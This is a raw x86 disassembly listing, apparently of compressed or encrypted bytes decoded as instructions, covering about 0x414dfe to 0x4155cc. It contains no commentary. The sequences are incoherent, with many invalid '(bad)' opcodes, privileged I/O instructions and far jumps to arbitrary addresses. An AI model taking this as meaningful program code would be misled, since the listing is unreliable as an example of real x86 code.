  414dfe:	adc    eax,0xf6623024
  414e03:	call   0x42fdebc0
  414e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e09:	pushf  
  414e0a:	jo     0x414d91
  414e0c:	inc    eax
  414e0d:	dec    edi
  414e0e:	and    esp,DWORD PTR [edi+0x34b059ab]
  414e14:	loop   0x414e4f
  414e16:	repz shr DWORD PTR [edi],1
  414e19:	rep ins DWORD PTR es:[edi],dx
  414e1b:	push   ebp
  414e1c:	or     dh,BYTE PTR ds:0x61250e8a
  414e22:	sbb    bl,BYTE PTR [ecx]
  414e24:	jmp    0xa68d7c2e
  414e29:	adc    BYTE PTR [ebx+0x262377c0],ah
  414e2f:	push   0xd38f295d
  414e34:	push   ss
  414e35:	pusha  
  414e36:	pop    ecx
  414e37:	push   eax
  414e38:	dec    ebp
  414e39:	inc    esi
  414e3a:	(bad)  
  414e3b:	inc    ebx
  414e3c:	pop    esp
  414e3d:	pop    es
  414e3e:	inc    edx
  414e3f:	aas    
  414e40:	jb     0x414e86
  414e42:	and    BYTE PTR [ebx],al
  414e44:	sub    al,0x61
  414e46:	test   al,0xb3
  414e48:	dec    esp
  414e49:	mov    dl,0x79
  414e4b:	scas   eax,DWORD PTR es:[edi]
  414e4c:	pushf  
  414e4d:	retf   
  414e4e:	repnz mov bh,0xfe
  414e51:	fld    DWORD PTR [esi-0x791cf9e5]
  414e57:	lods   al,BYTE PTR ds:[esi]
  414e58:	xchg   ecx,eax
  414e59:	push   edx
  414e5a:	int3   
  414e5b:	xchg   edx,eax
  414e5c:	mov    bl,0xf2
  414e5e:	mov    dh,0x9
  414e60:	mov    cl,0xb0
  414e62:	mov    DWORD PTR [esi+esi*8],edx
  414e65:	fst    DWORD PTR [eax-0x317f0a85]
  414e6b:	sti    
  414e6c:	cmp    cl,dh
  414e6e:	arpl   WORD PTR [ebx+edi*1],bx
  414e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e72:	arpl   WORD PTR [ecx-0x21],cx
  414e75:	retf   
  414e76:	pop    esi
  414e77:	ret    
  414e78:	sub    al,0xab
  414e7a:	aam    0x8b
  414e7c:	add    eax,0x1f5346d1
  414e81:	adc    BYTE PTR [eax+0x51409af9],0xf9
  414e88:	test   eax,0xfac47088
  414e8d:	add    ecx,DWORD PTR [esi-0x35]
  414e90:	fwait
  414e91:	xor    al,0x6d
  414e93:	test   DWORD PTR [ecx],0xeffa72b5
  414e99:	add    bh,ah
  414e9b:	aad    0xc8
  414e9d:	cmc    
  414e9e:	inc    ebx
  414e9f:	add    BYTE PTR [ecx+0x45],0x52
  414ea3:	das    
  414ea4:	scas   eax,DWORD PTR es:[edi]
  414ea5:	and    DWORD PTR [esi-0x3c9390b3],ebx
  414eab:	(bad)  
  414eac:	int3   
  414ead:	adc    bh,ah
  414eaf:	add    al,0xa5
  414eb1:	sbb    bh,BYTE PTR [ecx+edx*2-0x66e025c]
  414eb8:	sub    BYTE PTR [eax],cl
  414eba:	std    
  414ebb:	mov    es,WORD PTR [ebp+0x3c]
  414ebe:	out    dx,al
  414ebf:	shl    dh,cl
  414ec1:	in     eax,dx
  414ec2:	push   esp
  414ec3:	mov    esp,0x579ca8a
  414ec8:	fcom   DWORD PTR [edx]
  414eca:	les    esp,FWORD PTR [edi+esi*1]
  414ecd:	jo     0x414ebf
  414ecf:	punpcklbw mm7,DWORD PTR [edi]
  414ed2:	pop    eax
  414ed3:	loope  0x414f41
  414ed5:	mov    eax,0xb0c3e0b0
  414eda:	retf   0x88b3
  414edd:	icebp  
  414ede:	cwde   
  414edf:	lods   al,BYTE PTR ds:[esi]
  414ee0:	pop    ecx
  414ee1:	jns    0x414f61
  414ee3:	dec    ebx
  414ee4:	xchg   ebp,eax
  414ee5:	sub    al,0x2f
  414ee7:	inc    edi
  414ee8:	sti    
  414ee9:	xlat   BYTE PTR ds:[ebx]
  414eea:	test   BYTE PTR [edx-0x38dfd4d1],ch
  414ef0:	push   0xffffff8c
  414ef2:	aas    
  414ef3:	(bad)  
  414ef4:	sti    
  414ef5:	data16 cmc 
  414ef7:	cld    
  414ef8:	jp     0x414eb6
  414efa:	fcom   DWORD PTR [ecx+0x5e]
  414efd:	mov    dl,0xac
  414eff:	fdivr  st(3),st
  414f01:	and    DWORD PTR [eax],0xa318770a
  414f07:	add    al,0x22
  414f09:	push   0xdcb9a843
  414f0e:	jbe    0x414e90
  414f10:	cmc    
  414f11:	in     al,0x8e
  414f13:	sub    eax,0x2cc79130
  414f18:	jno    0x414eeb
  414f1a:	adc    eax,0x28aaed4
  414f1f:	cld    
  414f20:	pushf  
  414f21:	xchg   ecx,eax
  414f22:	pop    ds
  414f23:	(bad)  
  414f25:	xor    eax,0x80b52e1e
  414f2a:	ds ss ja 0x414f48
  414f2e:	or     eax,DWORD PTR [esi+0x3a7baa76]
  414f34:	std    
  414f35:	aam    0xec
  414f37:	in     al,dx
  414f38:	clc    
  414f39:	pop    edx
  414f3a:	sbb    edx,0xffffffe9
  414f3d:	push   edi
  414f3e:	xchg   BYTE PTR [ebx+0x6e12ab4e],dh
  414f44:	sub    eax,0xd5d9126a
  414f49:	or     bl,BYTE PTR [ebx]
  414f4b:	jb     0x414f8f
  414f4d:	leave  
  414f4e:	test   eax,0xefbd88ae
  414f53:	mov    ds:0x668184,al
  414f58:	retf   0x99e7
  414f5b:	fwait
  414f5c:	push   esi
  414f5d:	mov    edi,0xce7058e7
  414f62:	push   es
  414f63:	sbb    esp,esp
  414f65:	or     DWORD PTR [ebp-0x19f40ee9],edx
  414f6b:	(bad)  
  414f6c:	retf   0xcc01
  414f6f:	ins    BYTE PTR es:[edi],dx
  414f70:	popa   
  414f71:	mov    ds:0x571d3129,al
  414f76:	xor    eax,0xab0dbf84
  414f7b:	push   eax
  414f7c:	stc    
  414f7d:	or     BYTE PTR [eax+0x4a],al
  414f80:	(bad)
  414f83:	retf   0x6bd2
  414f86:	sbb    BYTE PTR [ecx+0x6c],dl
  414f89:	mov    bl,0x42
  414f8b:	sbb    eax,0xc2a4caa6
  414f90:	dec    ebp
  414f91:	pop    esp
  414f92:	add    BYTE PTR [esi],dh
  414f94:	sbb    BYTE PTR [ebx],ch
  414f96:	inc    ebx
  414f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f98:	fxch   st(6)
  414f9a:	ins    BYTE PTR es:[edi],dx
  414f9b:	mov    bh,0x52
  414f9d:	or     eax,ebp
  414f9f:	sar    ch,0x83
  414fa2:	pop    eax
  414fa3:	(bad)  
  414fa4:	mov    ch,0xb
  414fa6:	and    DWORD PTR [esi],eax
  414fa8:	and    ebp,edi
  414faa:	out    0x5a,al
  414fac:	or     ecx,DWORD PTR [eax]
  414fae:	ror    ebx,cl
  414fb0:	mov    edi,0x7426a01c
  414fb5:	jecxz  0x414f9c
  414fb7:	clc    
  414fb8:	imul   ecx,eax,0xffffff83
  414fbb:	sbb    DWORD PTR [esi-0x7c],eax
  414fbe:	std    
  414fbf:	repnz mov ah,0xac
  414fc2:	inc    edx
  414fc3:	fcom   DWORD PTR [ecx-0x58]
  414fc6:	sub    al,0x71
  414fc8:	in     eax,0x13
  414fca:	in     al,dx
  414fcb:	sub    BYTE PTR [ebx+0x1f3b79c7],ch
  414fd1:	xchg   BYTE PTR [edi+esi*4-0x671b9fd2],cl
  414fd8:	ret    0x9af8
  414fdb:	inc    edi
  414fdc:	push   edi
  414fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fde:	xor    BYTE PTR [edx],dl
  414fe0:	mov    bl,0x4d
  414fe2:	enter  0xfd54,0x43
  414fe6:	shr    ch,0x25
  414fe9:	mov    bh,BYTE PTR cs:[ecx+0x78]
  414fed:	imul   BYTE PTR [edi+0x71]
  414ff0:	ins    BYTE PTR es:[edi],dx
  414ff1:	lds    ebx,FWORD PTR ds:0xe0249f6c
  414ff7:	dec    esp
  414ff8:	mov    cl,0xd5
  414ffa:	jle    0x414fee
  414ffc:	or     BYTE PTR [eax+eiz*1],al
  414fff:	or     DWORD PTR [edx-0x7a2d2d2],edx
  415005:	jno    0x414fa6
  415007:	mov    edi,0xaaf9c58f
  41500c:	lock xchg esp,eax
  41500e:	out    0x55,eax
  415010:	add    esi,ebp
  415012:	and    edi,DWORD PTR [edi]
  415014:	icebp  
  415015:	pop    esi
  415016:	(bad)  
  415017:	push   esp
  415018:	sub    DWORD PTR [edx+0x75],ebp
  41501b:	mul    eax
  41501d:	icebp  
  41501e:	mov    DWORD PTR [eax-0x42278536],ebp
  415024:	dec    eax
  415025:	and    DWORD PTR [ebx+0x734bd3b],ecx
  41502b:	xor    bl,BYTE PTR [ebp+0x8f01ea3]
  415031:	lahf   
  415032:	fisub  DWORD PTR [ecx+0x53ad1544]
  415038:	mov    bh,0xfd
  41503a:	bound  esi,QWORD PTR [eax+0x10a3fe1a]
  415040:	pop    es
  415041:	(bad)  
  415042:	ins    DWORD PTR es:[edi],dx
  415043:	(bad)  
  415044:	cmp    ebp,DWORD PTR [eax-0x2]
  415047:	sub    edi,DWORD PTR [esi-0x4fbab111]
  41504d:	mov    esi,0x5741098f
  415052:	clc    
  415053:	les    ebp,FWORD PTR [esi+0x66]
  415056:	mov    dl,0x3b
  415058:	dec    esi
  415059:	xchg   esi,eax
  41505a:	ins    BYTE PTR es:[edi],dx
  41505b:	adc    BYTE PTR [edx+0x62c6e601],0x1d
  415062:	inc    edi
  415063:	inc    esi
  415064:	pushf  
  415065:	adc    eax,0xc443d03c
  41506a:	or     al,0xec
  41506c:	imul   esi,DWORD PTR [ecx],0xfffffff3
  41506f:	or     DWORD PTR [ecx-0x13],edx
  415072:	aam    0xdb
  415074:	inc    ebx
  415075:	cdq    
  415076:	cmp    eax,ebx
  415078:	push   edx
  415079:	cmp    esp,DWORD PTR [eax+0x2d655e71]
  41507f:	out    0xfa,eax
  415081:	xor    DWORD PTR [eax-0x25],eax
  415084:	jbe    0x41506b
  415086:	xor    eax,0xaa3be961
  41508b:	shl    BYTE PTR [esi],cl
  41508d:	fnstcw WORD PTR [edi+0x66]
  415090:	xchg   edx,eax
  415091:	adc    DWORD PTR [edi-0x3282bf],ebx
  415097:	idiv   bl
  415099:	jle    0x415047
  41509b:	add    BYTE PTR [edx-0x52ff6c80],ah
  4150a1:	dec    ecx
  4150a2:	or     edx,ecx
  4150a4:	aaa    
  4150a5:	jle    0x415078
  4150a7:	add    eax,0xc42f25a2
  4150ac:	mov    eax,0x3e81d38d
  4150b1:	mov    ecx,0xe44c9690
  4150b6:	(bad)  
  4150b7:	mov    bh,0x5a
  4150b9:	stos   BYTE PTR es:[edi],al
  4150ba:	out    dx,eax
  4150bb:	or     eax,0xb8862c05
  4150c0:	push   esi
  4150c1:	xchg   DWORD PTR [edx+0x36],ecx
  4150c4:	cmp    BYTE PTR [ebx+0x715da38e],ah
  4150ca:	mov    bl,0x5d
  4150cc:	and    al,BYTE PTR [esi+ebp*8]
  4150cf:	sbb    DWORD PTR [ebp-0x20],esp
  4150d2:	ret    
  4150d3:	sub    eax,DWORD PTR [edi-0xb55bdbf]
  4150d9:	dec    edx
  4150da:	stos   BYTE PTR es:[edi],al
  4150db:	repz call 0x721d:0x127e6010
  4150e3:	shl    DWORD PTR [eax+0x4bf52d1b],1
  4150e9:	add    al,BYTE PTR [ebp+0x2f]
  4150ec:	adc    edi,ebx
  4150ee:	jg     0x41507f
  4150f0:	data16 sahf 
  4150f2:	sub    esi,DWORD PTR [edx-0x2bda7a0d]
  4150f8:	stos   DWORD PTR es:[edi],eax
  4150f9:	jl     0x41508d
  4150fb:	das    
  4150fc:	sub    edx,ebx
  4150fe:	cmp    edi,DWORD PTR [ebp+0x64b6109b]
  415104:	lahf   
  415105:	pop    eax
  415106:	xor    edi,DWORD PTR [eax-0x13b8e17e]
  41510c:	out    dx,eax
  41510d:	sub    bh,al
  41510f:	sub    DWORD PTR [ecx],esp
  415111:	repnz push edx
  415113:	push   DWORD PTR [edx+edi*2+0x31]
  415117:	push   eax
  415118:	dec    esp
  415119:	in     eax,0xe4
  41511b:	ret    0xf285
  41511e:	adc    BYTE PTR [ecx+0xf],ah
  415121:	enter  0xac0d,0xd9
  415125:	outs   dx,BYTE PTR ds:[esi]
  415126:	sbb    esi,DWORD PTR [ebx+0x15]
  415129:	pop    ecx
  41512a:	js     0x415182
  41512c:	and    dh,BYTE PTR [edx+0x7d868323]
  415132:	mov    bh,0x72
  415134:	push   ds
  415135:	xor    ecx,edi
  415137:	sbb    eax,0x7708e0fe
  41513c:	sub    al,0x20
  41513e:	ret    0x309f
  415141:	iret   
  415142:	ins    BYTE PTR es:[edi],dx
  415143:	jns    0x41512e
  415145:	inc    dx
  415147:	rol    BYTE PTR [edi-0x4aade177],0x45
  41514e:	mov    esp,0x4b0e846b
  415153:	leave  
  415154:	sti    
  415155:	jg     0x4151d2
  415157:	into   
  415158:	sub    dl,BYTE PTR [bp+di]
  41515b:	sub    ebx,DWORD PTR [ecx]
  41515d:	jg     0x41519a
  41515f:	cmp    BYTE PTR [esi-0x27],0x95
  415163:	mov    edx,0xaf14ddd8
  415168:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41516a:	pop    edi
  41516b:	fxch   st(7)
  41516d:	xor    BYTE PTR [edi-0x233db59a],0x4f
  415174:	jge    0x4151ec
  415176:	push   eax
  415177:	mov    ebp,DWORD PTR [edi-0x71]
  41517a:	int3   
  41517b:	je     0x415156
  41517d:	mov    ds:0x30da0dea,eax
  415182:	xchg   esp,eax
  415183:	and    eax,0x888451f4
  415188:	or     eax,0x8dbf0061
  41518d:	inc    ebx
  41518e:	(bad)  
  415190:	pushf  
  415191:	pop    esi
  415192:	fdivr  DWORD PTR [ebp-0x4b]
  415195:	pop    ebp
  415196:	scas   eax,DWORD PTR es:[edi]
  415197:	xchg   BYTE PTR [ecx],bl
  415199:	and    al,0x9e
  41519b:	imul   edi,DWORD PTR [ecx+0x32],0x87f83923
  4151a2:	adc    BYTE PTR [edx-0x4e],ch
  4151a5:	retf   0x9e52
  4151a8:	pusha  
  4151a9:	dec    edx
  4151aa:	pop    edi
  4151ab:	stos   DWORD PTR es:[edi],eax
  4151ac:	sar    BYTE PTR [eax-0x124d8703],cl
  4151b2:	push   ecx
  4151b3:	scas   al,BYTE PTR es:[edi]
  4151b4:	loopne 0x415173
  4151b6:	sets   BYTE PTR ss:[eax]
  4151ba:	cwde   
  4151bb:	push   es
  4151bc:	div    DWORD PTR [ebx+0x37]
  4151bf:	scas   al,BYTE PTR es:[edi]
  4151c0:	sub    eax,0x3a6f0333
  4151c5:	mov    fs,WORD PTR [esi]
  4151c7:	fstp   st(3)
  4151c9:	adc    ecx,DWORD PTR [ecx-0x169681f5]
  4151cf:	dec    esi
  4151d0:	cpuid  
  4151d2:	js     0x415208
  4151d4:	es cmp eax,0x64c80c0b
  4151da:	fcomp  QWORD PTR [edx+0x5b]
  4151dd:	hlt    
  4151de:	pop    ebx
  4151df:	bound  esp,QWORD PTR [eax]
  4151e1:	call   0x5000917f
  4151e6:	add    BYTE PTR ds:0xdbc7c239,0x64
  4151ed:	fyl2x  
  4151ef:	push   ss
  4151f0:	inc    edx
  4151f1:	mov    bl,0x38
  4151f3:	int    0x9d
  4151f5:	inc    edi
  4151f6:	ds pusha 
  4151f8:	arpl   WORD PTR [edx-0x17],cx
  4151fb:	push   0x47b1597c
  415200:	in     al,dx
  415201:	and    al,0x25
  415203:	dec    esp
  415204:	test   BYTE PTR [ebp+0x59c195e8],dl
  41520a:	enter  0x545a,0x11
  41520e:	or     ebp,DWORD PTR [ebp-0xa]
  415211:	lods   al,BYTE PTR ds:[esi]
  415212:	sub    bl,BYTE PTR [ecx+0x460910b]
  415218:	adc    al,0xff
  41521a:	sti    
  41521b:	mov    gs,WORD PTR ds:0xfb90933d
  415221:	xchg   esp,eax
  415222:	loope  0x41527b
  415224:	push   ds
  415225:	cmp    ebx,DWORD PTR [esi+0x6d34ab87]
  41522b:	mov    ebp,0x75856f25
  415230:	lods   al,BYTE PTR ds:[esi]
  415231:	cmp    BYTE PTR [edi],dl
  415233:	push   es
  415234:	xor    DWORD PTR [esi-0x29a5590f],0x18
  41523b:	(bad)  
  41523c:	lea    eax,[ecx-0x2ca9b1e7]
  415242:	int3   
  415243:	repz inc ebp
  415245:	fst    DWORD PTR [ebx+edi*1+0x4e]
  415249:	xor    BYTE PTR [ecx+0x27dcaa08],0xa6
  415250:	stc    
  415251:	sbb    al,0x8b
  415253:	fadd   QWORD PTR [eax]
  415255:	adc    ebx,DWORD PTR [edi-0x60506a4a]
  41525b:	or     ch,BYTE PTR [edx-0x45]
  41525e:	mov    ebx,DWORD PTR [ebx]
  415260:	int3   
  415261:	fcomi  st,st(2)
  415263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415264:	aad    0x3e
  415266:	(bad)
  415269:	xchg   edi,eax
  41526a:	pop    es
  41526b:	aas    
  41526c:	gs mov esp,0x1ca0503f
  415272:	cmp    al,bl
  415274:	xor    eax,0xc96ec3ca
  415279:	jg     0x41520c
  41527b:	imul   esi,edx,0xffffffa9
  41527e:	jge    0x41529f
  415280:	ffreep st(2)
  415282:	or     BYTE PTR [ebx],bl
  415284:	xor    eax,DWORD PTR [edi-0x5a708dd9]
  41528a:	into   
  41528b:	sbb    DWORD PTR [esi],0x74ea1c23
  415291:	xchg   ebx,eax
  415292:	dec    edi
  415293:	push   esp
  415294:	cmp    DWORD PTR [edi+0x65],0x6e
  415298:	xor    al,BYTE PTR [edi]
  41529a:	pop    ss
  41529b:	mov    ecx,DWORD PTR [eax]
  41529d:	dec    ebx
  41529e:	sub    BYTE PTR ss:[edi+edx*2],0x1c
  4152a3:	mov    ebx,ebp
  4152a5:	xchg   edi,eax
  4152a6:	bound  edx,QWORD PTR [ebx+ebp*8]
  4152a9:	fcom   DWORD PTR [edx]
  4152ab:	mov    ecx,0x767f3631
  4152b0:	das    
  4152b1:	mov    ebp,0x187d5aa5
  4152b6:	test   dh,al
  4152b8:	mov    ds:0xe7d7fea7,al
  4152bd:	pop    ds
  4152be:	or     al,0x21
  4152c0:	mov    ds:0xce248dc1,al
  4152c5:	in     eax,dx
  4152c6:	and    DWORD PTR [eax+0x4547e4c2],ecx
  4152cc:	and    al,BYTE PTR [eax]
  4152ce:	and    ch,bh
  4152d0:	lods   eax,DWORD PTR ds:[esi]
  4152d1:	inc    esi
  4152d2:	les    edi,FWORD PTR ds:[ebx-0x7c6c565f]
  4152d9:	adc    esp,ebx
  4152db:	or     ebp,ebp
  4152dd:	ds test al,0x54
  4152e0:	sbb    dh,BYTE PTR [esi+0x33fe2be5]
  4152e6:	pusha  
  4152e7:	push   esi
  4152e8:	mov    es,WORD PTR [edi+0x4cd53e07]
  4152ee:	xchg   esp,eax
  4152ef:	xor    al,0x20
  4152f1:	mov    ch,0xaa
  4152f3:	data16 in al,0xbc
  4152f6:	fsubp  st(1),st
  4152f8:	mov    ebx,0xf41e41a9
  4152fd:	or     esi,edx
  4152ff:	int3   
  415300:	arpl   WORD PTR ds:0x7a1e00d1,ax
  415306:	mov    ecx,DWORD PTR [eax+0x4]
  415309:	adc    DWORD PTR [ebp+0x626d5109],0x2d
  415310:	outs   dx,DWORD PTR ds:[esi]
  415311:	aam    0x25
  415313:	jp     0x4152bd
  415315:	aas    
  415316:	add    esi,DWORD PTR [edx+0xa]
  415319:	jge    0x41529e
  41531b:	push   cs
  41531c:	adc    eax,DWORD PTR [esi+ebx*8+0x4f27c688]
  415323:	inc    esp
  415324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415325:	push   es
  415326:	cmp    eax,0x467d74eb
  41532b:	ins    BYTE PTR es:[edi],dx
  41532c:	iret   
  41532d:	ins    DWORD PTR es:[edi],dx
  41532e:	test   ecx,edi
  415330:	daa    
  415331:	jbe    0x41533d
  415333:	cs clc 
  415335:	mov    bl,0x76
  415337:	push   eax
  415338:	les    esi,FWORD PTR [esi]
  41533a:	push   0x106cfb52
  41533f:	cli    
  415340:	neg    DWORD PTR [esi-0x2]
  415343:	fimul  WORD PTR [esi+0x1a]
  415346:	retf   
  415347:	adc    ch,BYTE PTR [edx-0x5f]
  41534a:	dec    eax
  41534b:	xor    cl,BYTE PTR ds:0x6dc8de68
  415351:	fcom   DWORD PTR [edi-0x39]
  415354:	pop    ds
  415355:	mov    al,BYTE PTR [edi]
  415357:	mov    al,0xe9
  415359:	sub    al,0x64
  41535b:	out    dx,al
  41535c:	shr    al,cl
  41535e:	cmp    al,0xf9
  415360:	mov    esp,0x4b906fc1
  415365:	jmp    0xe19303fc
  41536a:	cli    
  41536b:	gs jecxz 0x4152f2
  41536e:	pop    ebp
  41536f:	cwde   
  415370:	inc    edx
  415371:	pop    es
  415372:	jecxz  0x4152fa
  415374:	in     al,dx
  415375:	pop    edi
  415376:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415378:	xchg   esp,eax
  415379:	sbb    al,0x97
  41537b:	pop    ebx
  41537c:	test   eax,0x45c83084
  415381:	ret    0x4485
  415384:	repz scas al,BYTE PTR es:[edi]
  415386:	je     0x415325
  415388:	push   ecx
  41538a:	mov    ebp,0x39f6d4a7
  41538f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415390:	mov    esp,0x4af6a77
  415395:	mov    al,ds:0x25379571
  41539a:	sbb    ah,BYTE PTR [eax-0x29bfada7]
  4153a0:	inc    edi
  4153a1:	(bad)  
  4153a2:	dec    esp
  4153a3:	or     al,0x67
  4153a5:	mov    al,ds:0x2e100b68
  4153aa:	fidiv  DWORD PTR [edx+0x5]
  4153ad:	int    0x49
  4153af:	dec    esp
  4153b0:	int3   
  4153b1:	adc    al,0xd8
  4153b3:	shl    DWORD PTR [ebp-0x745dd791],1
  4153b9:	sbb    esi,0xdb33383a
  4153bf:	add    ecx,ebp
  4153c1:	outs   dx,DWORD PTR ds:[esi]
  4153c2:	push   ecx
  4153c3:	lods   al,BYTE PTR ds:[esi]
  4153c4:	inc    ecx
  4153c5:	out    dx,al
  4153c6:	push   ebp
  4153c7:	xlat   BYTE PTR ds:[ebx]
  4153c8:	(bad)  
  4153c9:	cld    
  4153ca:	push   esi
  4153cb:	adc    al,0x41
  4153cd:	pop    edx
  4153ce:	xor    bh,BYTE PTR [ebx-0x6a]
  4153d1:	sub    ecx,DWORD PTR [ebx+0x3d550b6c]
  4153d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153d8:	adc    BYTE PTR [esi-0x686c755e],bl
  4153de:	jp     0x415408
  4153e0:	js     0x41537b
  4153e2:	ss jmp 0x4153b6
  4153e5:	pop    ds
  4153e6:	and    BYTE PTR [ecx+0x7a0e0029],dh
  4153ec:	inc    esi
  4153ed:	dec    eax
  4153ee:	jmp    0x495602d
  4153f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f4:	outs   dx,DWORD PTR ds:[esi]
  4153f5:	sub    al,0xff
  4153f7:	leave  
  4153f8:	or     ah,BYTE PTR [eax+0x79]
  4153fb:	xor    DWORD PTR [eax+0x5c],ebx
  4153fe:	outs   dx,BYTE PTR ds:[esi]
  4153ff:	xchg   edx,ebx
  415401:	mov    ah,0xdb
  415403:	pusha  
  415404:	test   al,0xe
  415406:	xor    eax,0xb63b4e84
  41540b:	ror    BYTE PTR [ecx-0x14],cl
  41540e:	retf   0x12af
  415411:	repnz pop eax
  415413:	in     eax,0xac
  415415:	imul   ebx,DWORD PTR [ecx-0x72],0x51
  415419:	std    
  41541a:	retf   0xe674
  41541d:	mov    edx,ebp
  41541f:	loop   0x4153e7
  415421:	push   0xada316cb
  415426:	pop    edx
  415427:	pop    edi
  415428:	inc    esp
  415429:	nop
  41542a:	jb     0x4154a4
  41542c:	cmp    edi,DWORD PTR [ecx+0x1750d423]
  415432:	and    DWORD PTR [ebx],0xd112c2aa
  415438:	fmul   DWORD PTR [edx]
  41543a:	hlt    
  41543b:	std    
  41543c:	mov    bh,0x9b
  41543e:	adc    BYTE PTR [edi],bl
  415440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415441:	(bad)  
  415442:	and    al,0x97
  415444:	xchg   ebp,eax
  415445:	in     eax,dx
  415446:	and    al,BYTE PTR [edi-0x3c532106]
  41544c:	cmp    ch,0xae
  41544f:	jnp    0x415402
  415451:	sub    edx,DWORD PTR [edi]
  415453:	ins    DWORD PTR es:[edi],dx
  415454:	pop    esi
  415455:	ret    
  415456:	jmp    0xaaf9:0x91206a8a
  41545d:	pop    esi
  41545e:	cdq    
  41545f:	call   0x610c4ff7
  415464:	xor    al,0xc8
  415466:	dec    esi
  415467:	xchg   ebx,eax
  415468:	out    0x0,al
  41546a:	retf   
  41546b:	imul   esi,DWORD PTR ds:0x99f74ea5,0x656d4b1c
  415475:	mov    al,ds:0x34f2284d
  41547b:	sbb    cl,dl
  41547d:	lods   al,BYTE PTR ds:[esi]
  41547e:	push   edx
  41547f:	ins    BYTE PTR es:[edi],dx
  415480:	xchg   ecx,eax
  415481:	push   ecx
  415482:	int3   
  415483:	sbb    edi,DWORD PTR [eax+0x2ccf2c8a]
  415489:	adc    eax,esi
  41548b:	arpl   WORD PTR [ecx+0x7d0c9d48],bx
  415491:	(bad)  
  415492:	fist   WORD PTR [ebp+0x51d87220]
  415498:	cdq    
  415499:	add    BYTE PTR ds:0xc436aeea,al
  41549f:	or     dl,dl
  4154a1:	imul   edx,DWORD PTR [ebp-0xd],0x535017d1
  4154a8:	mov    ebp,0x7a0805ce
  4154ad:	xchg   ebp,eax
  4154ae:	in     al,0xf0
  4154b0:	fs pop ebx
  4154b2:	xor    DWORD PTR [esi+0x2c],edi
  4154b5:	push   ecx
  4154b6:	(bad)  
  4154b7:	push   ebp
  4154b8:	imul   esp,DWORD PTR [ecx+0xeefa74a],0xffffff91
  4154bf:	xchg   ebp,eax
  4154c0:	pavgb  mm2,QWORD PTR [ebp+0x7a]
  4154c4:	jae    0x415502
  4154c6:	or     eax,0x16d36c57
  4154cb:	push   esp
  4154cc:	call   0xe8291b3b
  4154d1:	add    al,0x4c
  4154d3:	retf   
  4154d4:	ja     0x41547d
  4154d6:	shr    DWORD PTR [esi+edi*4-0x10],1
  4154da:	fcomp  st(1)
  4154dc:	push   es
  4154dd:	daa    
  4154de:	cmp    DWORD PTR [ebx],esp
  4154e0:	jg     0x4154ab
  4154e2:	mov    esi,0x57bc5dc3
  4154e7:	mov    esi,0x653a8ed2
  4154ec:	ja     0x415503
  4154ee:	sbb    al,0x82
  4154f0:	mov    ds:0xfaba42fd,al
  4154f5:	out    0x4b,al
  4154f7:	adc    dh,BYTE PTR [ebp-0x77e37b80]
  4154fd:	jb     0x4154ab
  4154ff:	and    al,0x16
  415501:	test   al,0x1d
  415503:	adc    ah,BYTE PTR [edi]
  415505:	and    al,0xb
  415507:	ds mov ah,0x94
  41550a:	and    BYTE PTR [ecx],0x28
  41550d:	fwait
  41550e:	mov    ebx,0x7d6269c4
  415513:	stos   BYTE PTR es:[edi],al
  415514:	sub    al,0xf9
  415516:	jmp    0x711e:0x86f0e1d0
  41551d:	dec    edi
  41551e:	jmp    0xe1de:0x2102e751
  415525:	mov    ebx,0xc16e8468
  41552a:	sar    BYTE PTR [ebp-0x5ef97f08],cl
  415530:	inc    ebx
  415531:	in     eax,0x54
  415533:	jns    0x415508
  415535:	ins    BYTE PTR es:[edi],dx
  415536:	mov    WORD PTR [edi+0x5f31db3c],ds
  41553c:	add    al,BYTE PTR ds:0xb4b075a6
  415542:	icebp  
  415543:	push   ss
  415544:	aam    0x15
  415546:	cmp    eax,0x1bbce28c
  41554b:	arpl   bp,sp
  41554d:	aaa    
  41554e:	mov    ?,eax
  415550:	ins    BYTE PTR es:[edi],dx
  415551:	or     al,0xcc
  415553:	xchg   edi,eax
  415554:	lea    ebp,[ecx]
  415556:	aas    
  415557:	fwait
  415558:	xor    BYTE PTR [edi],ch
  41555a:	jns    0x41553b
  41555c:	xor    al,cl
  41555e:	retf   0x4cde
  415561:	aaa    
  415562:	aad    0x39
  415564:	shl    DWORD PTR [edi+0x20964331],cl
  41556a:	(bad)  
  41556b:	loop   0x4155eb
  41556d:	(bad)  
  41556e:	jbe    0x4155d0
  415570:	in     eax,dx
  415571:	sbb    DWORD PTR [esi],ebp
  415573:	xchg   edi,eax
  415574:	imul   edx,DWORD PTR [eax],0xf975d9a
  41557a:	fcmovnb st,st(6)
  41557c:	inc    dl
  41557e:	jns    0x4155b4
  415580:	mov    ebp,0xe9115949
  415585:	fwait
  415586:	xor    al,0xdf
  415588:	jns    0x415576
  41558a:	das    
  41558b:	je     0x4155f1
  41558d:	jmp    0x3a13:0x610d0b35
  415594:	xlat   BYTE PTR ds:[ebx]
  415595:	adc    al,0x15
  415597:	ins    BYTE PTR es:[edi],dx
  415598:	inc    edi
  415599:	add    dh,bh
  41559b:	retf   
  41559c:	iret   
  41559d:	cmp    bh,BYTE PTR [edx+0x266adfa8]
  4155a3:	adc    esp,0x27
  4155a6:	je     0x4155b2
  4155a8:	xchg   BYTE PTR [edx+0x5f],al
  4155ab:	jmp    0x4155ca
  4155ad:	adc    bl,dh
  4155af:	dec    ebx
  4155b0:	jmp    0x415584
  4155b2:	push   edx
  4155b3:	popf   
  4155b4:	pop    esi
  4155b5:	mov    WORD PTR [esi+edi*8-0x2a165ec8],di
  4155bd:	xor    DWORD PTR [ebx],0x5c
  4155c0:	inc    ecx
  4155c1:	mov    BYTE PTR [eax+0x8b65516],bh
  4155c7:	inc    ebx
  4155c8:	stos   DWORD PTR es:[edi],eax
  4155c9:	out    dx,eax
  4155ca:	xchg   edi,eax
  4155cb:	icebp  
  4155cc:	cmc    
